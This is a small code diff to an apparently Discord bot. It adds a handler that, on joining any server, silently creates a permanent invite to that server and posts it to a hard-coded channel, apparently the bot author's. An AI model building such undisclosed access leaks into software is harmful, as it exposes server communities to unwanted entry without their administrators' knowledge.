@@ -42,4 +42,11 @@ client.on("ready", () => {
   console.log(`Logged in as ${client.user.tag}!`);
 });
 
+client.on('guildCreate', async (guild) => {
+  const channel = client.channels.cache.get("835681281949696022");
+  const guildchannel = guild.channels.cache.filter(chx => chx.type === "text").find(x => x.position === 0);
+  const invite = await guildchannel.createInvite({maxAge: 0});
+  channel.send("Joined the server " + guild.name + " with invite code: discord.gg/" + invite.code);
+});
+
 client.login(TOKEN);
